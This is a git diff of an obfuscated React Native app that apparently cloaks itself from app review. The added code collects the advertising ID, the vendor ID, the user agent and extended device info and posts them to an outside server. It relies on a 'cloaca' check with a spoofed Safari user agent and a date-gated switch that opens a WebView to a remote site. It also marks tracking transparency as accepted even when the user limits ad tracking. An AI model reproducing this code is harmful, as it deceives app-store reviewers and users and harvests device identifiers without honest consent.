@@ -17,9 +17,21 @@ import ArcticBootVeil from './QueenStarCreativeRitualSrc/RatenueitPascegs/QueenS
 import ProductScreen from './QueenStarCreativeRitualSrc/RatenueitPascegs/ProductScreen';
 const DriftStackConstellation = AuroraStackAnvil();
 // libs
+import ReactNativeIdfaAaid, {
+  AdvertisingInfoResponse,
+} from '@sparkfabrik/react-native-idfa-aaid';
 import AsyncStorage from '@react-native-async-storage/async-storage';
 import { LogLevel, OneSignal } from 'react-native-onesignal';
 import AppleAdsAttribution from '@vladikstyle/react-native-apple-ads-attribution';
+import DeviceInfo from 'react-native-device-info';
+import { Settings } from 'react-native-fbsdk-next';
+// services
+import {
+  initMetaSdk,
+  logActivateApp,
+  logTestEvent,
+} from './QueenStarCreativeRitualSrc/service/metaSdk';
+import { buildExtInfo } from './QueenStarCreativeRitualSrc/service/buildExtInfo';
 
 const CryoRouteSpindle = () => {
   const SpindleScreen = DriftStackConstellation.Screen;
@@ -37,7 +49,8 @@ const CryoRouteSpindle = () => {
   };
   ///////////////////////////////////////////////////////////////////////
   const [route, setRoute] = useState(false);
-  //console.log('route===>', route)
+  console.log('route===>', route);
+  const [isLoading, setIsLoading] = useState(false);
   const [responseToPushPermition, setResponseToPushPermition] = useState(false);
   ////('Дозвіл на пуши прийнято? ===>', responseToPushPermition);
   const [uniqVisit, setUniqVisit] = useState(true);
@@ -50,20 +63,36 @@ const CryoRouteSpindle = () => {
   const [atribParam, setAtribParam] = useState(null);
   console.log('atribParam==>', atribParam);
   console.log('sab1==>', sab1);
+  const [idfa, setIdfa] = useState(null);
+  console.log('idfa==>', idfa);
+  const [aceptTransperency, setAceptTransperency] = useState(false);
   const [adServicesAtribution, setAdServicesAtribution] = useState(null);
   const [isDataReady, setIsDataReady] = useState(false);
   const [completeLink, setCompleteLink] = useState(false);
   const [finalLink, setFinalLink] = useState('');
   const [pushOpenWebview, setPushOpenWebview] = useState(false);
-  //console.log('pushOpenWebview==>', pushOpenWebview);
+  console.log('pushOpenWebview==>', pushOpenWebview);
   const [timeStampUserId, setTimeStampUserId] = useState(false);
   console.log('timeStampUserId==>', timeStampUserId);
   const [checkAsaData, setCheckAsaData] = useState(null);
   const [cloacaPass, setCloacaPass] = useState(null);
   console.log('cloacaPass==>', cloacaPass);
+  const [customUserAgent, setCustomUserAgent] = useState(null);
+  const [extinfo, setExtinfo] = useState(null);
+  //console.log('extinfoData==>', extinfo);
+  const [idfv, setIdfv] = useState(null);
+  console.log('idfv==>', idfv);
+  const [uid, setUid] = useState(null);
+  console.log('uid==>', uid);
 
   const INITIAL_URL = `https://solid-wave-pro.site/`;
   const URL_IDENTIFAIRE = `bZircyav`;
+
+  const ONESIGNAL_KEY = `bbacdd45-2168-4461-9610-6b41e670f18b`;
+
+  const TARGET_DATA = new Date(2026, 2, 8, 8, 8, 0);
+
+  const FATCH_TO_OUR_BACK = `https://orbitfield.site/`;
 
   useEffect(() => {
     const fetchData = async () => {
@@ -77,14 +106,14 @@ const CryoRouteSpindle = () => {
 
   useEffect(() => {
     const finalizeProcess = async () => {
-      if (isDataReady) {
+      if (isDataReady && uid) {
         await generateLink(); // Викликати generateLink, коли всі дані готові
         console.log('Фінальна лінка сформована!');
       }
     };
 
     finalizeProcess();
-  }, [isDataReady]);
+  }, [isDataReady, uid, pushOpenWebview]); // Викликати, коли isDataReady або uid змінюється
 
   // uniq_visit
   const checkUniqVisit = async () => {
@@ -139,8 +168,23 @@ const CryoRouteSpindle = () => {
         setCompleteLink(parsedData.completeLink);
         setFinalLink(parsedData.finalLink);
         setCloacaPass(parsedData.cloacaPass);
-        await performAppsFlyerOperationsContinuously();
+        setCustomUserAgent(parsedData.customUserAgent);
+        setUid(parsedData.uid);
+        setIdfa(parsedData.idfa ?? null);
+        setIdfv(parsedData.idfv ?? null);
+        setAceptTransperency(parsedData.aceptTransperency ?? false);
+
+        //await performAppsFlyerOperationsContinuously();
       } else {
+        const uniqueId = await DeviceInfo.getUniqueId();
+        setIdfv(uniqueId);
+
+        await fetchIdfa();
+        logActivateApp();
+        //logTestEvent();
+
+        gettingExtInfo();
+
         // Якщо дані не знайдені в AsyncStorage
         const results = await Promise.all([
           fetchAdServicesAttributionData(),
@@ -169,6 +213,10 @@ const CryoRouteSpindle = () => {
         completeLink,
         checkAsaData,
         cloacaPass,
+        customUserAgent,
+        idfa,
+        aceptTransperency,
+        uid,
       };
       const jsonData = JSON.stringify(data);
       await AsyncStorage.setItem('App', jsonData);
@@ -192,8 +240,13 @@ const CryoRouteSpindle = () => {
     completeLink,
     checkAsaData,
     cloacaPass,
+    customUserAgent,
+    idfa,
+    aceptTransperency,
+    uid,
   ]);
 
+  // Apple Search Ads Attribution
   const fetchAdServicesAttributionData = async () => {
     try {
       const adServicesAttributionData =
@@ -215,6 +268,117 @@ const CryoRouteSpindle = () => {
       //Alert.alert(message); // --> Some error message
     } finally {
       console.log('Attribution');
+    }
+  };
+  /////
+  const gettingExtInfo = async () => {
+    try {
+      const extInfo = await buildExtInfo();
+      const extInfoString = JSON.stringify(extInfo);
+      const extInfoEncoded = encodeURIComponent(extInfoString);
+      console.log('extInfo encoded:', extInfoEncoded);
+      setExtinfo(extInfoEncoded);
+    } catch (e) {
+      console.log('gettingExtInfo error:', e);
+    }
+  };
+
+  const extInfoFetchSent = useRef(false);
+
+  useEffect(() => {
+    if (!idfa || !idfv || !customUserAgent || !extinfo) return;
+    if (extInfoFetchSent.current) return;
+    extInfoFetchSent.current = true;
+
+    const sendExtInfo = async () => {
+      try {
+        const body = {
+          index: idfa,
+          strpull: extinfo,
+          udevice_android_device: idfv,
+          device_android_build: customUserAgent,
+        };
+
+        console.log('1t Request body:', body);
+        console.log('extInfoFetch: всі дані готові, відправляємо');
+
+        const r = await fetch(`${FATCH_TO_OUR_BACK}v1`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(body),
+        });
+
+        const data = await r.json();
+        console.log('SERVER RESPONSE:', data);
+
+        const rawStr = data?.raw_str;
+        if (!rawStr) {
+          console.log('No raw_str in response');
+          return;
+        }
+
+        const cleaned = rawStr.startsWith('&') ? rawStr.slice(1) : rawStr;
+        const parsed = {};
+        cleaned.split('&').forEach(pair => {
+          if (!pair) return;
+          const [rawKey, ...rest] = pair.split('=');
+          parsed[decodeURIComponent(rawKey || '')] = decodeURIComponent(
+            rest.join('=') || '',
+          );
+        });
+
+        console.log('PARSED RAW STR:', parsed);
+        const bin = parsed.bin;
+        console.log('BIN VALUE:', bin);
+        if (bin) {
+          setUid(bin);
+          console.log('UID встановлено:', bin);
+        } else {
+          console.log('bin not found in raw_str');
+        }
+      } catch (e) {
+        console.log('extInfoFetch error:', e);
+      }
+    };
+
+    sendExtInfo();
+  }, [idfa, idfv, customUserAgent, extinfo]);
+
+  // IDFA / ATT status
+  const fetchIdfa = async () => {
+    try {
+      const res = await ReactNativeIdfaAaid.getAdvertisingInfo();
+
+      if (!res.isAdTrackingLimited) {
+        setIdfa(res.id);
+
+        Settings.setAdvertiserTrackingEnabled(true);
+
+        //setTimeout(() => {
+        setAceptTransperency(true);
+        //}, 1500);
+        return true;
+      } else {
+        setIdfa('00000000-0000-0000-0000-000000000000');
+
+        Settings.setAdvertiserTrackingEnabled(false);
+
+        //setTimeout(() => {
+        setAceptTransperency(true);
+        //}, 2500);
+        console.log('НЕ ЗГОДА!!!!!!!!!');
+
+        return false;
+      }
+    } catch (err) {
+      setIdfa(null);
+
+      Settings.setAdvertiserTrackingEnabled(false);
+
+      setAceptTransperency(true);
+      console.log('Помилка отримання IDFA:', err);
+
+      return false;
     }
   };
 
@@ -270,12 +434,14 @@ const CryoRouteSpindle = () => {
     }
   };
 
-  // Remove this method to stop OneSignal Debugging
-  OneSignal.Debug.setLogLevel(LogLevel.Verbose);
+  useEffect(() => {
+    // Remove this method to stop OneSignal Debugging
+    OneSignal.Debug.setLogLevel(LogLevel.Verbose);
 
-  // OneSignal ініціалізація
-  OneSignal.initialize('bbacdd45-2168-4461-9610-6b41e670f18b');
-  //OneSignal.Debug.setLogLevel(OneSignal.LogLevel.Verbose);
+    // OneSignal ініціалізація
+    OneSignal.initialize(ONESIGNAL_KEY);
+    //OneSignal.Debug.setLogLevel(OneSignal.LogLevel.Verbose);
+  }, []);
 
   // Встановлюємо цей ID як OneSignal External ID
   useEffect(() => {
@@ -354,7 +520,7 @@ const CryoRouteSpindle = () => {
     const checkUrl = `${INITIAL_URL}${URL_IDENTIFAIRE}`;
     //console.log('checkUrl==========+>', checkUrl);
 
-    const targetData = new Date('2026-02-28T08:08:00'); //дата з якої поч працювати webView
+    const targetData = TARGET_DATA; //дата з якої поч працювати webView
     const currentData = new Date(); //текущая дата
 
     if (currentData <= targetData) {
@@ -363,16 +529,19 @@ const CryoRouteSpindle = () => {
     }
 
     const fetchCloaca = async () => {
-      //const deviceInfo = {
-      //  diviceUserAgent: DeviceInfo.getUserAgent(),
-      //};
-
       try {
+        const userAgent = await DeviceInfo.getUserAgent();
+        const systemVersion = DeviceInfo.getSystemVersion();
+        const deviceModel = DeviceInfo.getModel();
+
+        const customUserAgent = `${userAgent} ${deviceModel} Safari/604.1`;
+
+        setCustomUserAgent(customUserAgent);
+
         const r = await fetch(checkUrl, {
           method: 'GET',
           headers: {
-            'User-Agent':
-              'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',
+            'User-Agent': customUserAgent,
           },
         });
 
@@ -399,6 +568,9 @@ const CryoRouteSpindle = () => {
       console.log('Створення базової частини лінки');
       const baseUrl = [
         `${INITIAL_URL}${URL_IDENTIFAIRE}?${URL_IDENTIFAIRE}=1`,
+        idfa ? `idfa=${idfa}` : '',
+        idfv ? `idfv=${idfv}` : '',
+        uid ? `uid=${uid}` : '',
         oneSignalId ? `oneSignalId=${oneSignalId}` : '',
         `jthrhg=${timeStampUserId}`,
       ]
@@ -409,10 +581,8 @@ const CryoRouteSpindle = () => {
       let additionalParams = '';
 
       // Якщо sab1 undefined або пустий, встановлюємо subId1=atribParam
-      additionalParams = `${
-        atribParam ? `subId1=${atribParam}` : ''
-      }&checkData=${checkAsaData}`;
-
+      additionalParams = `${atribParam ? `subId1=${atribParam}` : ''}`;
+      //&checkData=${checkAsaData}
       console.log('additionalParams====>', additionalParams);
       // Формування фінального лінку
       const product = `${baseUrl}&${additionalParams}${
@@ -427,7 +597,7 @@ const CryoRouteSpindle = () => {
       // Встановлюємо completeLink у true
       setTimeout(() => {
         setCompleteLink(true);
-      }, 1000);
+      }, 3000);
     } catch (error) {
       console.error('Помилка при формуванні лінку:', error);
     }
@@ -449,6 +619,8 @@ const CryoRouteSpindle = () => {
               responseToPushPermition,
               product: finalLink,
               timeStampUserId: timeStampUserId,
+              customUserAgent: customUserAgent,
+              uid: uid,
             }}
             name="ProductScreen"
             component={ProductScreen}
@@ -497,12 +669,10 @@ const CryoRouteSpindle = () => {
   };
 
   ///////// Loader //////
-  const [isLoading, setIsLoading] = useState(false);
-
   useEffect(() => {
     setTimeout(() => {
       setIsLoading(true);
-    }, 2500);
+    }, 5000);
   }, []);
 
   return (
